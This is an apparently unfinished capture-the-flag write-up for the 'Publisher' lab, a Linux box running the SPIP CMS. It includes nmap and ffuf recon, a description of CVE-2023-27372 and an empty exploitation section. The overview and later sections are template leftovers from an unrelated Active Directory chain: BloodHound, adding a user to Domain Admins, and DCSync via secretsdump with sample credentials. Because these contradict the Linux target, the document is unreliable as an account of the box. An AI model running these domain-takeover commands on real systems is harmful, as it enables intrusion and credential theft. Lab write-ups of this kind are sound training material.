# Publisher — THM

**Tipe:** Linux, Web Application<br>
**Difficulty:** Easy<br>
**OS:** Linux<br>

---

## Preview
A web application using a vulnerable version of the Content Management System SPIP allows for RCE. The privilege escalation vector is in the SUID script. The system is protected by AppArmor, so before executing the PE vector, AppArmor must be bypassed.

## Attack Path Overview
```
Recon → SMB null session → cred leak (config.xml)
      → WinRM foothold (svc_backup)
      → BloodHound: svc_backup punya GenericAll ke DA group
      → Abuse ACL → add self to Domain Admins
      → DCSync → domain compromised
```

---

## 1. Network Scanning
```bash
# Port scan
nmap -sT  -sV -O -sC -T4 -oN Lab/tmp/publisher.nmap 10.80.166.10

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-27 08:02 +0000
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips

Nmap done: 1 IP address (1 host up) scanned in 50.54 seconds
```
Open port 22 and 80. Port 80 uses Apache server and is created with SPIP. Usually, you can get credentials from http and connect to ssh on port 22.

## 2. Enumeration

```bash
# Directory enumeration
ffuf -u http://publisher.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://publisher.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 4369ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 215ms]
spip                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 212ms]
:: Progress: [62281/62281] :: Job [1/1] :: 187 req/sec :: Duration: [0:05:40] :: Errors: 0 ::
                                                                                               
```
From the enumeration results, there are 3 endpoints: images/, server-status/, and spip/. Since the website uses the spip CMS, server-status is forbidden, and images/ only contains images, so just visit spip/.<br><br>

Visit spip/ ![SPIP Page](assets/spip_page.png)

### View source page from spip/
![SPIP sourse page](assets/spip_source_page.png)
In the page source, the version of the spip used was `4.2.0` and several endpoints were also found.
```text
/spip/spip.php?rubrique1
/spip/spip.php?page=recherche
/spip/spip.php?page=login&url=spip.php
/spip/spip.php?page=contact
/spip/spip.php?page=backend
/spip/spip.php?page=plan
```

## 3. Initial Access

### CVE Analysis
`CVE-2023-27372` is an unauthenticated PHP code RCE vulnerability in SPIP. One of the vulnerable paths is in the forgot password feature in the `oubli` parameter. The old SPIP used serialized string with serialization -> `s:4:"vuln"` where s=string, 4=length and "vuln"=value. In this case, i made the input i entered be considered serialized so that it passed sanitization. <br>
Visit ![Login Page](assets/login_page.png)
<br>
After visiting the login page, go to the forgot password/oubli page. ![Oubli Page](assets/oubli_page.png).

### Exploitation


## 4. Privilege Escalation
**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation) / T1484 (Domain Policy Modification) — sesuaikan

Jelaskan proses analisis privesc — bukan cuma command, tapi *kenapa* jalur ini dipilih:
```bash
# Contoh: BloodHound collection
bloodhound-python -u svc_backup -p 'P@ssw0rd123' -d domain.local -c All

# Analisis di BloodHound GUI: svc_backup -> GenericAll -> Domain Admins group
```

Abuse path:
```bash
net rpc group addmem "Domain Admins" svc_backup -U domain.local/svc_backup%'P@ssw0rd123'
```

## 5. Lateral Movement (jika relevan)
**MITRE ATT&CK:** T1021 (Remote Services) / T1550 (Use Alternate Authentication Material)

<!-- Jelaskan pivot ke host/user lain, pass-the-hash, dst -->

## 6. Post-Exploitation / Impact
**MITRE ATT&CK:** T1003 (OS Credential Dumping) / T1078.002 (Domain Accounts)

```bash
# Contoh: DCSync untuk full domain compromise
secretsdump.py domain.local/svc_backup:'P@ssw0rd123'@10.10.x.x
```
Bukti impact: [dump hash krbtgt/administrator, akses ke sistem sensitif, dst]

## 7. Cleanup (kalau engagement berbayar/live client)
<!-- Untuk box CTF-style biasanya di-skip, tapi kalau ini simulasi engagement
resmi, dokumentasikan langkah cleanup: hapus user yang ditambahkan, revert
ACL, hapus tools/payload yang ditinggal di target. -->
- [ ] Hapus user `svc_backup` dari grup Domain Admins
- [ ] Hapus tools/script yang ditinggal di target
- [ ] Konfirmasi tidak ada persistence mechanism tertinggal

## 8. Lessons Learned & Detection Notes
<!-- Ini bagian yang membedakan red teamer matang dari sekadar "dapat shell".
Tunjukkan pemahaman defensive side juga. -->
- Root cause: [mis. ACL misconfiguration, kredensial di plaintext file]
- Bagaimana ini bisa terdeteksi blue team: [event ID relevan, log yang harus dimonitor]
- Rekomendasi remediasi: [least privilege, credential hygiene, dst]

## References
- [Link ke box/platform]
- [Artikel teknik yang relevan, mis. tentang ACL abuse]
